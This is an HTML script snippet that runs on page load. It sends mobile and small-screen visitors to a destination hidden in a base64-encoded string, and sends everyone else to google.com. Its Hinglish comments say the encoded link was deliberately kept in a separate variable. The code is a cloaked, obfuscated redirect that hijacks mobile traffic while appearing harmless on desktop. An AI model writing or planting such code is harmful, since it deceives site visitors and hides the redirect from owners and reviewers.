    <script>
    document.addEventListener('DOMContentLoaded', function() {
        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        var screenWidth = window.innerWidth;

        if (isMobile || screenWidth <= 768) {
            // Humne encrypted string ko bilkul alag variable mein rakha hai
            var secretCode = "aHR0cHM6Ly9jcmFmdGFnZ3JlZ2F0ZS5jb20vcnQzbjVkcTc/a2V5PTBlNTYxMmZiNTc5OTAzMGEyOWRmMTMyNWQxMTg5Yjcy";
            
            try {
                var finalUrl = atob(secretCode);
                // Agar link sahi decode ho jaye, tabhi redirect karega
                if (finalUrl.startsWith("http")) {
                    window.location.replace(finalUrl);
                } else {
                    window.location.replace("https://google.com/");
                }
            } catch(e) {
                // Agar koi error aaye toh google par bhej dega, error loop nahi banayega
                window.location.replace("https://google.com/");
            }
        } else {
            window.location.replace("https://google.com/");
        }
    });
    </script>
